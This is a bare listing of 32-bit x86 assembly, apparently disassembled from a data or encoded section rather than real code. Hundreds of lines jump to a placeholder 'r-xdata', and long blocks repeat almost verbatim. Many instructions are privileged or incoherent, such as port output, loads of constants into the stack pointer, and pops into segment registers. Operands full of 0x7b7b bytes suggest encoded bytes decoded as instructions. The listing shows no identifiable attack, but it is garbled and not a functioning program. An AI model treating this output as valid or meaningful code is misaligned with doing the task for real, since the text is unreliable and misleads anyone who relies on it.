or dl [ ebp - 0x1dd7b7c ]
mov ebx 0x337bff74
and al 0x25
or [ eax - 0x45 ] 0x1d
mov [ ss : 0xffffffff92d33ef6 ] eax
jns r-xdata
jmp r-xdata
and edi [ ecx + 0x10 ]
sub [ ebp + ebp * 8 + 0x7b7b7bd7 ] al
adc eax [ ebx + edi * 2 - 0x726d8485 ]
insb
jpo r-xdata
xor esp [ eax ]
jpo r-xdata
rcl [ edx + 0x7b7b798c ] cl
idiv [ esi ]
jpo r-xdata
jns r-xdata
dec esi
jpo r-xdata
jmp r-xdata
sbb eax 0x48833ef2
mov ebx 0x813ef21d
adc edi [ edi + 0x7a ]
jpo r-xdata
jmp r-xdata
jpo r-xdata
mov ebx 0x7ea0107e
jmp sub_47871e
jmp r-xdata
jpo r-xdata
sbb eax 0xf03126f2
mov [ 0x3726f21d ] eax
sbb [ 0x203326f2 ] bl
xchg edx eax
popfd
jae r-xdata
adc [ ebx ] 0x7b7b7a7f
or [ eax - 0x45 ] 0x1d
jmp r-xdata
mov ebp 0xf013487f
xchg [ es : edx + 0x7b7b4e4e ] edx
adc [ ebx + 0x7ea0107e ] bh
sub_4783df
mov eax 0x81c2ff74
test [ eax + esi * 8 + 0x543992b3 ] al
jpo r-xdata
test bl ch
jmp r-xdata
jmp sub_4783da
xchg edx eax
mov eax 0xeb848488
jmp r-xdata
je r-xdata
aad 0x71
jpo r-xdata
std
jecxz r-xdata
jmp r-xdata
jpo r-xdata
and edx [ edx + 0x7b7b7f96 ]
jmp r-xdata
jmp r-xdata
xchg ebx eax
jo r-xdata
jpo r-xdata
xchg esi eax
jg r-xdata
jmp r-xdata
jpo r-xdata
rcl [ edx + 0x7b7b798c ] cl
sbb eax 0x23973ef2
adc [ 0xffffffff953ef21d ] ecx
jmp r-xdata
jpo r-xdata
xchg edi eax
xchg ebx eax
adc ebx [ edx + edi + 0x13 ]
mov [ ss : 0xffffffff92d33ef6 ] eax
jns r-xdata
jmp r-xdata
xchg edx eax
xchg edx eax
push esp
mov [ esp + eax * 4 - 0x14141415 ] eax
jmp r-xdata
jmp r-xdata
idiv [ esi ]
jpo r-xdata
sbb ch ch
sub eax 0x7b69d992
jpo r-xdata
jmp r-xdata
and [ edx + esi * 8 ] ch
std
out 0x7b eax
jpo r-xdata
cmp dl [ ebx ]
and edx [ ecx ]
or eax 0x953ef21d
xchg edi eax
outsd
sub edx [ edx + 0x7b7b4bb9 ]
jmp r-xdata
[ edi ]
and dl [ edx + 0x7b7b7a8e ]
xchg edx eax
and [ esp + eax * 4 - 0x1414147c ] cl
cmp eax 0x6ef09317
jpo r-xdata
jmp r-xdata
mov esp 0x90bb33e
pop ss
pop ebx
mov esp 0x213b73e
or ebx [ esi ]
mov esp 0xd09ab3e
pop ebx
pop ebx
xchg ebx eax
pop eax
inc ebx
jpo r-xdata
jmp r-xdata
stosb [ edi ]
inc ecx
jpo r-xdata
xchg edx eax
rcl [ ebp - 0x449f7b7c ] 0x92
xchg ebx eax
or dl [ ebp - 0x1dd7b7c ]
mov ebx 0x337bff74
rcl [ edx + 0x7b7b798c ] cl
and al 0x25
and dh bh
mov ebx 0x80c3ff74
test [ esi + esi * 8 + 0x3ef6a336 ] al
or [ eax - 0x45 ] 0x1d
and edi [ ecx + 0x10 ]
sub [ ebp + ebp * 8 + 0x7b7b7bd7 ] al
adc eax [ ebx + edi * 2 - 0x726d8485 ]
insb
jpo r-xdata
xor esp [ eax ]
jpo r-xdata
jns r-xdata
dec esi
jpo r-xdata
jmp r-xdata
sbb eax 0x48833ef2
mov ebx 0x813ef21d
adc edi [ edi + 0x7a ]
jpo r-xdata
jmp r-xdata
jpo r-xdata
mov ebx 0x7ea0107e
jmp sub_47871e
jmp r-xdata
jpo r-xdata
sbb eax 0xf03126f2
mov [ 0x3726f21d ] eax
sbb [ 0x203326f2 ] bl
xchg edx eax
popfd
jae r-xdata
adc [ ebx ] 0x7b7b7a7f
or [ eax - 0x45 ] 0x1d
jmp r-xdata
mov ebp 0xf013487f
xchg [ es : edx + 0x7b7b4e4e ] edx
adc [ ebx + 0x7ea0107e ] bh
sub_4783f5
jmp r-xdata
xor eax 0x3e
xchg [ edx + 0x7b7b3a25 ] edx
adc edi [ ebx + 0x6b ]
jpo r-xdata
test bl ch
sbb eax 0x1d873ef2
lea esp [ edx ]
xchg edx eax
je r-xdata
test [ ebx + ebp * 8 - 0x28020d15 ] al
insd
jpo r-xdata
jpo r-xdata
cmp dl [ ebx ]
jpo r-xdata
jmp r-xdata
adc ebx [ ecx + 0x2c2322f4 ]
std
jecxz r-xdata
idiv [ esi ]
lahf
sub edx [ edx + 0x7b7b55ee ]
std
idiv [ ebx + 0x7b ]
jpo r-xdata
xchg [ 0x228d36f2 ] ebx
jmp r-xdata
xchg edx eax
xchg edx eax
push esp
mov [ esp + eax * 4 - 0x14141415 ] eax
jmp r-xdata
adc [ ebx ] ecx
and al 0x11
or eax esi
mov esp 0x7b471992
jpo r-xdata
cmpsd [ esi ] [ edi ]
test [ esp + eax * 4 - 0x14141415 ] eax
sub [ edx + 0x7b7b482c ] dl
jmp r-xdata
xchg edi eax
jmp r-xdata
jpo r-xdata
jmp r-xdata
sbb ch ch
sub eax 0x7b69d992
jpo r-xdata
jmp r-xdata
xchg edi eax
inc edi
sub [ eax - 0x45 ] cl
sub eax 0x833ef22c
jpo r-xdata
xlat
jpo r-xdata
and edx [ edx + 0x7b7b7f96 ]
jmp r-xdata
jmp r-xdata
xchg ebx eax
jo r-xdata
jl r-xdata
outsd
sub edx [ edx + 0x7b7b4bb9 ]
jmp r-xdata
[ edi ]
and dl [ edx + 0x7b7b7a8e ]
xchg edx eax
and [ esp + eax * 4 - 0x1414147c ] cl
cmp eax 0x6ef09317
jpo r-xdata
rcl [ edx + 0x7b7b798c ] cl
sbb eax 0x23973ef2
adc [ 0xffffffff953ef21d ] ecx
xchg esi eax
jg r-xdata
jmp r-xdata
jpo r-xdata
xchg ebx eax
jpo r-xdata
jmp r-xdata
mov esp 0x90bb33e
pop ss
pop ebx
mov esp 0x213b73e
or ebx [ esi ]
mov esp 0xd09ab3e
pop ebx
pop ebx
xchg ebx eax
pop eax
inc ebx
jpo r-xdata
jmp r-xdata
stosb [ edi ]
inc ecx
jpo r-xdata
xchg edx eax
rcl [ ebp - 0x449f7b7c ] 0x92
jmp r-xdata
jpo r-xdata
and edx [ ecx ]
or eax 0x953ef21d
xchg edi eax
xchg ebx eax
and [ edx + esi * 8 ] ch
std
out 0x7b eax
jpo r-xdata
adc ebx [ edx + edi + 0x13 ]
sbb eax 0x92c306f2
0x7b47
jmp r-xdata
xchg ebx eax
or dl [ ebp - 0x1dd7b7c ]
mov ebx 0x337bff74
jmp r-xdata
and al 0x25
and dh bh
mov ebx 0x80c3ff74
test [ esi + esi * 8 + 0x3ef6a336 ] al
or [ eax - 0x45 ] 0x1d
mov [ ss : 0xffffffff92d33ef6 ] eax
jns r-xdata
jmp r-xdata
push es
retn
and edi [ ecx + 0x10 ]
sub [ ebp + ebp * 8 + 0x7b7b7bd7 ] al
adc eax [ ebx + edi * 2 - 0x726d8485 ]
insb
jpo r-xdata
xor esp [ eax ]
jpo r-xdata
rcl [ edx + 0x7b7b798c ] cl
idiv [ esi ]
jpo r-xdata
jns r-xdata
dec esi
jpo r-xdata
jmp r-xdata
sbb eax 0x48833ef2
mov ebx 0x813ef21d
adc edi [ edi + 0x7a ]
jpo r-xdata
jmp r-xdata
jpo r-xdata
mov ebx 0x7ea0107e
jmp sub_47871e
jmp r-xdata
jpo r-xdata
sbb eax 0xf03126f2
mov [ 0x3726f21d ] eax
sbb [ 0x203326f2 ] bl
xchg edx eax
popfd
jae r-xdata
adc [ ebx ] 0x7b7b7a7f
or [ eax - 0x45 ] 0x1d
jmp r-xdata
mov ebp 0xf013487f
xchg [ es : edx + 0x7b7b4e4e ] edx
adc [ ebx + 0x7ea0107e ] bh
sub_478411
xchg ebx eax
jpo r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
jmp r-xdata
je r-xdata
jmp r-xdata
jmp r-xdata
xchg edx esi
xchg edi eax
xor [ ss : 0x775b9236 ] ch
jpo r-xdata
inc edx
add [ esp + eax * 4 + 0x3992b3f0 ] 0xeb7b7b54
jmp sub_4783db
or [ edx + 0x7b ] al
jpo r-xdata
jmp sub_47848e
lea esp [ edx ]
idiv [ esi ]
lahf
sub edx [ edx + 0x7b7b55ee ]
std
idiv [ ebx + 0x7b ]
jpo r-xdata
inc esi
push ebp
jpo r-xdata
test [ ebx + ebp * 8 - 0x28020d15 ] al
insd
jpo r-xdata
and dh bh
mov ebx 0x80c3ff74
test [ esi + esi * 8 + 0x3ef6a336 ] al
jmp r-xdata
cmp dl [ ebx ]
jpo r-xdata
jmp r-xdata
adc ebx [ ecx + 0x2c2322f4 ]
std
jecxz r-xdata
xchg edx eax
cmp eax 0xeb848488
xchg edx eax
xchg edx eax
push esp
mov [ esp + eax * 4 - 0x14141415 ] eax
jmp r-xdata
adc [ ebx ] ecx
and al 0x11
or eax esi
mov esp 0x7b471992
jpo r-xdata
cmpsd [ esi ] [ edi ]
test [ esp + eax * 4 - 0x14141415 ] eax
sub [ edx + 0x7b7b482c ] dl
jmp r-xdata
xchg edi eax
jmp r-xdata
jpo r-xdata
sbb ch ch
sub eax 0x7b69d992
jpo r-xdata
jmp r-xdata
xchg edi eax
inc edi
sub [ eax - 0x45 ] cl
sub eax 0x833ef22c
jpo r-xdata
xlat
jpo r-xdata
and edx [ edx + 0x7b7b7f96 ]
jmp r-xdata
jmp r-xdata
xchg ebx eax
jo r-xdata
outsd
sub edx [ edx + 0x7b7b4bb9 ]
jmp r-xdata
[ edi ]
and dl [ edx + 0x7b7b7a8e ]
xchg edx eax
and [ esp + eax * 4 - 0x1414147c ] cl
cmp eax 0x6ef09317
jpo r-xdata
jmp r-xdata
rcl [ edx + 0x7b7b798c ] cl
sbb eax 0x23973ef2
adc [ 0xffffffff953ef21d ] ecx
xchg esi eax
jg r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
mov esp 0x90bb33e
pop ss
pop ebx
mov esp 0x213b73e
or ebx [ esi ]
mov esp 0xd09ab3e
pop ebx
pop ebx
xchg ebx eax
pop eax
inc ebx
jpo r-xdata
jmp r-xdata
stosb [ edi ]
inc ecx
jpo r-xdata
xchg edx eax
rcl [ ebp - 0x449f7b7c ] 0x92
jmp r-xdata
jpo r-xdata
and edx [ ecx ]
or eax 0x953ef21d
xchg edi eax
xchg ebx eax
and [ edx + esi * 8 ] ch
std
out 0x7b eax
jpo r-xdata
adc ebx [ edx + edi + 0x13 ]
xchg ebx eax
or dl [ ebp - 0x1dd7b7c ]
mov ebx 0x337bff74
and al 0x25
or [ eax - 0x45 ] 0x1d
mov [ ss : 0xffffffff92d33ef6 ] eax
jns r-xdata
jmp r-xdata
and edi [ ecx + 0x10 ]
sub [ ebp + ebp * 8 + 0x7b7b7bd7 ] al
adc eax [ ebx + edi * 2 - 0x726d8485 ]
insb
jpo r-xdata
xor esp [ eax ]
jpo r-xdata
rcl [ edx + 0x7b7b798c ] cl
idiv [ esi ]
jpo r-xdata
jns r-xdata
dec esi
jpo r-xdata
jmp r-xdata
sbb eax 0x48833ef2
mov ebx 0x813ef21d
adc edi [ edi + 0x7a ]
jpo r-xdata
jmp r-xdata
jpo r-xdata
mov ebx 0x7ea0107e
jmp sub_47871e
jmp r-xdata
jpo r-xdata
sbb eax 0xf03126f2
mov [ 0x3726f21d ] eax
sbb [ 0x203326f2 ] bl
xchg edx eax
popfd
jae r-xdata
adc [ ebx ] 0x7b7b7a7f
or [ eax - 0x45 ] 0x1d
jmp r-xdata
mov ebp 0xf013487f
xchg [ es : edx + 0x7b7b4e4e ] edx
adc [ ebx + 0x7ea0107e ] bh
sub_478479
xchg edx eax
mov esp 0xeb7b7b70
jmp r-xdata
jmp r-xdata
xchg edi eax
xor [ ss : 0x775b9236 ] ch
jpo r-xdata
or [ edx + 0x7b ] al
jpo r-xdata
jmp sub_47848e
lea esp [ edx ]
idiv [ esi ]
lahf
sub edx [ edx + 0x7b7b55ee ]
std
idiv [ ebx + 0x7b ]
jpo r-xdata
inc esi
push ebp
jpo r-xdata
test [ ebx + ebp * 8 - 0x28020d15 ] al
insd
jpo r-xdata
and dh bh
mov ebx 0x80c3ff74
test [ esi + esi * 8 + 0x3ef6a336 ] al
jmp r-xdata
cmp dl [ ebx ]
jpo r-xdata
jmp r-xdata
adc ebx [ ecx + 0x2c2322f4 ]
std
jecxz r-xdata
xchg edx eax
cmp eax 0xeb848488
xchg edx eax
xchg edx eax
push esp
mov [ esp + eax * 4 - 0x14141415 ] eax
jmp r-xdata
adc [ ebx ] ecx
and al 0x11
or eax esi
mov esp 0x7b471992
jpo r-xdata
cmpsd [ esi ] [ edi ]
test [ esp + eax * 4 - 0x14141415 ] eax
sub [ edx + 0x7b7b482c ] dl
jmp r-xdata
xchg edi eax
jmp r-xdata
jpo r-xdata
sbb ch ch
sub eax 0x7b69d992
jpo r-xdata
jmp r-xdata
xchg edi eax
inc edi
sub [ eax - 0x45 ] cl
sub eax 0x833ef22c
jpo r-xdata
xlat
jpo r-xdata
and edx [ edx + 0x7b7b7f96 ]
jmp r-xdata
jmp r-xdata
xchg ebx eax
jo r-xdata
outsd
sub edx [ edx + 0x7b7b4bb9 ]
jmp r-xdata
[ edi ]
and dl [ edx + 0x7b7b7a8e ]
xchg edx eax
and [ esp + eax * 4 - 0x1414147c ] cl
cmp eax 0x6ef09317
jpo r-xdata
jmp r-xdata
rcl [ edx + 0x7b7b798c ] cl
sbb eax 0x23973ef2
adc [ 0xffffffff953ef21d ] ecx
xchg esi eax
jg r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
mov esp 0x90bb33e
pop ss
pop ebx
mov esp 0x213b73e
or ebx [ esi ]
mov esp 0xd09ab3e
pop ebx
pop ebx
xchg ebx eax
pop eax
inc ebx
jpo r-xdata
jmp r-xdata
stosb [ edi ]
inc ecx
jpo r-xdata
xchg edx eax
rcl [ ebp - 0x449f7b7c ] 0x92
jmp r-xdata
jpo r-xdata
and edx [ ecx ]
or eax 0x953ef21d
xchg edi eax
xchg ebx eax
and [ edx + esi * 8 ] ch
std
out 0x7b eax
jpo r-xdata
adc ebx [ edx + edi + 0x13 ]
xchg ebx eax
or dl [ ebp - 0x1dd7b7c ]
mov ebx 0x337bff74
and al 0x25
or [ eax - 0x45 ] 0x1d
mov [ ss : 0xffffffff92d33ef6 ] eax
jns r-xdata
jmp r-xdata
and edi [ ecx + 0x10 ]
sub [ ebp + ebp * 8 + 0x7b7b7bd7 ] al
adc eax [ ebx + edi * 2 - 0x726d8485 ]
insb
jpo r-xdata
xor esp [ eax ]
jpo r-xdata
rcl [ edx + 0x7b7b798c ] cl
idiv [ esi ]
jpo r-xdata
jns r-xdata
dec esi
jpo r-xdata
jmp r-xdata
sbb eax 0x48833ef2
mov ebx 0x813ef21d
adc edi [ edi + 0x7a ]
jpo r-xdata
jmp r-xdata
jpo r-xdata
mov ebx 0x7ea0107e
jmp sub_47871e
jmp r-xdata
jpo r-xdata
sbb eax 0xf03126f2
mov [ 0x3726f21d ] eax
sbb [ 0x203326f2 ] bl
xchg edx eax
popfd
jae r-xdata
adc [ ebx ] 0x7b7b7a7f
or [ eax - 0x45 ] 0x1d
jmp r-xdata
mov ebp 0xf013487f
xchg [ es : edx + 0x7b7b4e4e ] edx
adc [ ebx + 0x7ea0107e ] bh
sub_47848e
jmp r-xdata
jo r-xdata
ja r-xdata
jpo r-xdata
sub eax 0x36c73ebc
and ebx [ ss : esi ]
mov esp 0x2d15bb3e
mov esp 0x90bb33e
jpo r-xdata
jmp r-xdata
jmp r-xdata
xchg ebx eax
or dl [ ebp - 0x1dd7b7c ]
mov ebx 0x337bff74
and al 0x25
jpo r-xdata
sbb eax 0x923526f2
mov al [ 0x1d7b7b57 ]
fst [ ss : edx + 0x7b7b6f0d ]
sub esi eax
r-xdata
xchg edx eax
mov eax 0xeb848488
jmp r-xdata
jmp r-xdata
and edi [ ecx + 0x10 ]
sub [ ebp + ebp * 8 + 0x7b7b7bd7 ] al
adc eax [ ebx + edi * 2 - 0x726d8485 ]
insb
jpo r-xdata
push esp
mov [ esp + eax * 4 - 0x14141415 ] eax
jmp r-xdata
cmp eax 0xeb848488
je r-xdata
xchg edi eax
xor [ ss : 0x775b9236 ] ch
jpo r-xdata
jns r-xdata
dec esi
jpo r-xdata
jmp r-xdata
cmp dl [ ebx ]
aad 0x71
jpo r-xdata
or [ edx + 0x7b ] al
jpo r-xdata
jmp sub_47848e
jpo r-xdata
mov ebx 0x7ea0107e
jmp sub_47871e
jmp r-xdata
jpo r-xdata
xchg edx eax
xchg edx eax
std
lea esp [ edx ]
idiv [ esi ]
lahf
sub edx [ edx + 0x7b7b55ee ]
std
idiv [ ebx + 0x7b ]
jpo r-xdata
inc esi
push ebp
jpo r-xdata
jmp r-xdata
sbb ch ch
sub eax 0x7b69d992
jpo r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
test [ ebx + ebp * 8 - 0x28020d15 ] al
insd
jpo r-xdata
and dh bh
mov ebx 0x80c3ff74
test [ esi + esi * 8 + 0x3ef6a336 ] al
jmp r-xdata
mov ebp 0xf013487f
xchg [ es : edx + 0x7b7b4e4e ] edx
adc [ ebx + 0x7ea0107e ] bh
outsd
sub edx [ edx + 0x7b7b4bb9 ]
jmp r-xdata
[ edi ]
and dl [ edx + 0x7b7b7a8e ]
xchg edx eax
and [ esp + eax * 4 - 0x1414147c ] cl
cmp eax 0x6ef09317
jpo r-xdata
and edx [ edx + 0x7b7b7f96 ]
jmp r-xdata
jmp r-xdata
xchg ebx eax
jo r-xdata
jpo r-xdata
jmp r-xdata
jecxz r-xdata
adc ebx [ ecx + 0x2c2322f4 ]
std
xchg edx eax
jmp r-xdata
pop ss
pop ebx
mov esp 0x213b73e
or ebx [ esi ]
mov esp 0xd09ab3e
pop ebx
pop ebx
xchg ebx eax
pop eax
inc ebx
jpo r-xdata
mov esp 0x90bb33e
jmp r-xdata
stosb [ edi ]
inc ecx
jpo r-xdata
xchg edx eax
rcl [ ebp - 0x449f7b7c ] 0x92
jpo r-xdata
xchg esi eax
jg r-xdata
jmp r-xdata
jpo r-xdata
adc [ ebx ] ecx
and al 0x11
or eax esi
mov esp 0x7b471992
jpo r-xdata
cmpsd [ esi ] [ edi ]
test [ esp + eax * 4 - 0x14141415 ] eax
sub [ edx + 0x7b7b482c ] dl
jmp r-xdata
xchg edi eax
or [ eax - 0x45 ] 0x1d
jmp r-xdata
rcl [ edx + 0x7b7b798c ] cl
sbb eax 0x23973ef2
adc [ 0xffffffff953ef21d ] ecx
jmp r-xdata
jpo r-xdata
and edx [ ecx ]
or eax 0x953ef21d
xchg edi eax
xchg ebx eax
and [ edx + esi * 8 ] ch
std
out 0x7b eax
jpo r-xdata
adc ebx [ edx + edi + 0x13 ]
xchg edi eax
inc edi
sub [ eax - 0x45 ] cl
sub eax 0x833ef22c
jpo r-xdata
xlat
xor esp [ eax ]
jpo r-xdata
mov [ ss : 0xffffffff92d33ef6 ] eax
jns r-xdata
jmp r-xdata
sbb eax 0x48833ef2
mov ebx 0x813ef21d
adc edi [ edi + 0x7a ]
jpo r-xdata
jmp r-xdata
rcl [ edx + 0x7b7b798c ] cl
idiv [ esi ]
jpo r-xdata
sbb eax 0xf03126f2
mov [ 0x3726f21d ] eax
sbb [ 0x203326f2 ] bl
xchg edx eax
popfd
jae r-xdata
adc [ ebx ] 0x7b7b7a7f
or [ eax - 0x45 ] 0x1d
sub_478490
jmp r-xdata
jpo r-xdata
jmp r-xdata
jmp r-xdata
xchg edx eax
mov eax 0xeb848488
jmp r-xdata
jmp r-xdata
je r-xdata
xchg edi eax
xor [ ss : 0x775b9236 ] ch
jpo r-xdata
aad 0x71
jpo r-xdata
or [ edx + 0x7b ] al
jpo r-xdata
jmp sub_47848e
std
lea esp [ edx ]
idiv [ esi ]
lahf
sub edx [ edx + 0x7b7b55ee ]
std
idiv [ ebx + 0x7b ]
jpo r-xdata
inc esi
push ebp
jpo r-xdata
jmp r-xdata
jpo r-xdata
test [ ebx + ebp * 8 - 0x28020d15 ] al
insd
jpo r-xdata
and dh bh
mov ebx 0x80c3ff74
test [ esi + esi * 8 + 0x3ef6a336 ] al
jmp r-xdata
and edx [ edx + 0x7b7b7f96 ]
jmp r-xdata
jmp r-xdata
xchg ebx eax
jo r-xdata
cmp dl [ ebx ]
jpo r-xdata
jmp r-xdata
jecxz r-xdata
adc ebx [ ecx + 0x2c2322f4 ]
std
xchg edx eax
cmp eax 0xeb848488
jpo r-xdata
xchg esi eax
jg r-xdata
jmp r-xdata
jpo r-xdata
xchg edx eax
xchg edx eax
push esp
mov [ esp + eax * 4 - 0x14141415 ] eax
jmp r-xdata
adc [ ebx ] ecx
and al 0x11
or eax esi
mov esp 0x7b471992
jpo r-xdata
cmpsd [ esi ] [ edi ]
test [ esp + eax * 4 - 0x14141415 ] eax
sub [ edx + 0x7b7b482c ] dl
jmp r-xdata
xchg edi eax
jmp r-xdata
rcl [ edx + 0x7b7b798c ] cl
sbb eax 0x23973ef2
adc [ 0xffffffff953ef21d ] ecx
jmp r-xdata
jpo r-xdata
and edx [ ecx ]
or eax 0x953ef21d
xchg edi eax
xchg ebx eax
and [ edx + esi * 8 ] ch
std
out 0x7b eax
jpo r-xdata
adc ebx [ edx + edi + 0x13 ]
sbb ch ch
sub eax 0x7b69d992
jpo r-xdata
jmp r-xdata
xchg edi eax
inc edi
sub [ eax - 0x45 ] cl
sub eax 0x833ef22c
jpo r-xdata
xlat
mov [ ss : 0xffffffff92d33ef6 ] eax
jns r-xdata
jmp r-xdata
outsd
sub edx [ edx + 0x7b7b4bb9 ]
jmp r-xdata
[ edi ]
and dl [ edx + 0x7b7b7a8e ]
xchg edx eax
and [ esp + eax * 4 - 0x1414147c ] cl
cmp eax 0x6ef09317
jpo r-xdata
rcl [ edx + 0x7b7b798c ] cl
idiv [ esi ]
jpo r-xdata
jmp r-xdata
mov esp 0x90bb33e
pop ss
pop ebx
mov esp 0x213b73e
or ebx [ esi ]
mov esp 0xd09ab3e
pop ebx
pop ebx
xchg ebx eax
pop eax
inc ebx
jpo r-xdata
jmp r-xdata
stosb [ edi ]
inc ecx
jpo r-xdata
xchg edx eax
rcl [ ebp - 0x449f7b7c ] 0x92
xchg ebx eax
or dl [ ebp - 0x1dd7b7c ]
mov ebx 0x337bff74
and al 0x25
or [ eax - 0x45 ] 0x1d
and edi [ ecx + 0x10 ]
sub [ ebp + ebp * 8 + 0x7b7b7bd7 ] al
adc eax [ ebx + edi * 2 - 0x726d8485 ]
insb
jpo r-xdata
xor esp [ eax ]
jpo r-xdata
jns r-xdata
dec esi
jpo r-xdata
jmp r-xdata
sbb eax 0x48833ef2
mov ebx 0x813ef21d
adc edi [ edi + 0x7a ]
jpo r-xdata
jmp r-xdata
jpo r-xdata
mov ebx 0x7ea0107e
jmp sub_47871e
jmp r-xdata
jpo r-xdata
sbb eax 0xf03126f2
mov [ 0x3726f21d ] eax
sbb [ 0x203326f2 ] bl
xchg edx eax
popfd
jae r-xdata
adc [ ebx ] 0x7b7b7a7f
or [ eax - 0x45 ] 0x1d
jmp r-xdata
mov ebp 0xf013487f
xchg [ es : edx + 0x7b7b4e4e ] edx
adc [ ebx + 0x7ea0107e ] bh
sub_478495
mov esp 0x3036973e
sub eax 0x775b9236
jpo r-xdata
or [ edx + 0x7b ] al
jpo r-xdata
jmp sub_47848e
lea esp [ edx ]
idiv [ esi ]
lahf
sub edx [ edx + 0x7b7b55ee ]
std
idiv [ ebx + 0x7b ]
jpo r-xdata
inc esi
push ebp
jpo r-xdata
test [ ebx + ebp * 8 - 0x28020d15 ] al
insd
jpo r-xdata
and dh bh
mov ebx 0x80c3ff74
test [ esi + esi * 8 + 0x3ef6a336 ] al
jmp r-xdata
cmp dl [ ebx ]
jpo r-xdata
jmp r-xdata
adc ebx [ ecx + 0x2c2322f4 ]
std
jecxz r-xdata
xchg edx eax
cmp eax 0xeb848488
xchg edx eax
xchg edx eax
push esp
mov [ esp + eax * 4 - 0x14141415 ] eax
jmp r-xdata
adc [ ebx ] ecx
and al 0x11
or eax esi
mov esp 0x7b471992
jpo r-xdata
cmpsd [ esi ] [ edi ]
test [ esp + eax * 4 - 0x14141415 ] eax
sub [ edx + 0x7b7b482c ] dl
jmp r-xdata
xchg edi eax
jmp r-xdata
jpo r-xdata
sbb ch ch
sub eax 0x7b69d992
jpo r-xdata
jmp r-xdata
xchg edi eax
inc edi
sub [ eax - 0x45 ] cl
sub eax 0x833ef22c
jpo r-xdata
xlat
jpo r-xdata
and edx [ edx + 0x7b7b7f96 ]
jmp r-xdata
jmp r-xdata
xchg ebx eax
jo r-xdata
outsd
sub edx [ edx + 0x7b7b4bb9 ]
jmp r-xdata
[ edi ]
and dl [ edx + 0x7b7b7a8e ]
xchg edx eax
and [ esp + eax * 4 - 0x1414147c ] cl
cmp eax 0x6ef09317
jpo r-xdata
jmp r-xdata
rcl [ edx + 0x7b7b798c ] cl
sbb eax 0x23973ef2
adc [ 0xffffffff953ef21d ] ecx
xchg esi eax
jg r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
mov esp 0x90bb33e
pop ss
pop ebx
mov esp 0x213b73e
or ebx [ esi ]
mov esp 0xd09ab3e
pop ebx
pop ebx
xchg ebx eax
pop eax
inc ebx
jpo r-xdata
jmp r-xdata
stosb [ edi ]
inc ecx
jpo r-xdata
xchg edx eax
rcl [ ebp - 0x449f7b7c ] 0x92
jmp r-xdata
jpo r-xdata
and edx [ ecx ]
or eax 0x953ef21d
xchg edi eax
xchg ebx eax
and [ edx + esi * 8 ] ch
std
out 0x7b eax
jpo r-xdata
adc ebx [ edx + edi + 0x13 ]
xchg ebx eax
or dl [ ebp - 0x1dd7b7c ]
mov ebx 0x337bff74
and al 0x25
or [ eax - 0x45 ] 0x1d
mov [ ss : 0xffffffff92d33ef6 ] eax
jns r-xdata
jmp r-xdata
and edi [ ecx + 0x10 ]
sub [ ebp + ebp * 8 + 0x7b7b7bd7 ] al
adc eax [ ebx + edi * 2 - 0x726d8485 ]
insb
jpo r-xdata
xor esp [ eax ]
jpo r-xdata
rcl [ edx + 0x7b7b798c ] cl
idiv [ esi ]
jpo r-xdata
jns r-xdata
dec esi
jpo r-xdata
jmp r-xdata
sbb eax 0x48833ef2
mov ebx 0x813ef21d
adc edi [ edi + 0x7a ]
jpo r-xdata
jmp r-xdata
jpo r-xdata
mov ebx 0x7ea0107e
jmp sub_47871e
jmp r-xdata
jpo r-xdata
sbb eax 0xf03126f2
mov [ 0x3726f21d ] eax
sbb [ 0x203326f2 ] bl
xchg edx eax
popfd
jae r-xdata
adc [ ebx ] 0x7b7b7a7f
or [ eax - 0x45 ] 0x1d
jmp r-xdata
mov ebp 0xf013487f
xchg [ es : edx + 0x7b7b4e4e ] edx
adc [ ebx + 0x7ea0107e ] bh
sub_478529
jmp r-xdata
jpo r-xdata
adc [ ebx ] 0x7b7b7a7f
jmp r-xdata
xor esp [ eax ]
jpo r-xdata
and edx [ edx + 0x7b7b7f96 ]
jmp r-xdata
sbb eax 0x48833ef2
mov ebx 0x813ef21d
adc edi [ edi + 0x7a ]
jpo r-xdata
jmp r-xdata
jpo r-xdata
sbb eax 0xf03126f2
mov [ 0x3726f21d ] eax
sbb [ 0x203326f2 ] bl
xchg edx eax
popfd
jae r-xdata
or [ eax - 0x45 ] 0x1d
adc [ ebx ] 0x7b7b7a7f
rcl [ edx + 0x7b7b798c ] cl
jmp r-xdata
sbb eax 0x23973ef2
adc [ 0xffffffff953ef21d ] ecx
sub_47852b
adc [ ebx - 0x6e ] ebx
xlat
jns r-xdata
idiv [ esi ]
rcl [ edx + 0x7b7b798c ] cl
jpo r-xdata
jmp r-xdata
xchg edi eax
and edx [ ecx ]
or eax 0x953ef21d
and edx [ edx + 0x7b7b7f96 ]
jmp r-xdata
jpo r-xdata
jmp r-xdata
rcl [ edx + 0x7b7b798c ] cl
sbb eax 0x23973ef2
adc [ 0xffffffff953ef21d ] ecx
sub_478603
xchg ebx eax
xchg [ esp + eax * 4 + 0x2b6f0e84 ] eax
xchg edx eax
mov ecx 0xeb7b7b4b
jmp r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
sbb eax 0xf03726f2
mov [ 0xffffffff8485e392 ] al
test bl ch
jmp r-xdata
jmp r-xdata
and [ 0xfffffffff03126f2 ] bl
mov [ 0x3726f21d ] eax
aaa
sub_478674
sar [ eax ] cl
jpo r-xdata
test [ edx + 0x7b7b62ac ] dl
xchg edx eax
std
jbe r-xdata
jpo r-xdata
jpo r-xdata
test [ 0x59be9273 ] ch
jpo r-xdata
jmp sub_4786e6
cmp dl [ ebp + 0x7b ]
jpo r-xdata
jmp r-xdata
xchg edx eax
0x7b40
jmp sub_478769
sbb eax 0xf03726f2
mov [ 0xffffffff8485e392 ] al
test bl ch
jmp r-xdata
jmp r-xdata
jpo r-xdata
and [ 0xfffffffff03126f2 ] bl
mov [ 0x3726f21d ] eax
aaa
jmp r-xdata
aaa
sub_4786c4
xchg edx eax
mov cl 0x51
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp sub_47871e
jmp r-xdata
jns r-xdata
jpo r-xdata
mov ebx 0x7ea0107e
and edi [ ecx + 0x10 ]
jmp r-xdata
mov ebp 0xf013487f
xchg [ es : edx + 0x7b7b4e4e ] edx
adc [ ebx + 0x7ea0107e ] bh
sub_478729
jpo r-xdata
jmp r-xdata
pop ds
push ebx
jpo r-xdata
mov ebp 0xf013487f
xchg [ es : edx + 0x7b7b4e4e ] edx
